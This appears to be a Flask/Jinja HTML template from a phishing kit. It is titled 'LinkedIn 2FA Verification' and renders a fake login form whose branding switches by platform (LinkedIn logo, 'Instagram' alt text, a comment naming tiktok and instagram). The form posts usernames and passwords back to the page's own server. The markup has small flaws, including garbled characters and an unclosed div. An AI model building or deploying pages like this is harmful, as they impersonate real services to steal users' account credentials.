<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LinkedIn 2FA Verification</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
</head>
<body class="{{ platform }}"> <!-- âœ… body gets platform class like tiktok, instagram, etc -->
    <div class="login-container">
        <img src="{{ url_for('static', filename='logos/linkedin.png') }}" class="logo" alt="Instagram">
    <h2>Log in to {{ platform.capitalize() }}</h2>
    <form method="post">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
    <p><a href="#">Forgot password?</a></p>
</body>
</html>
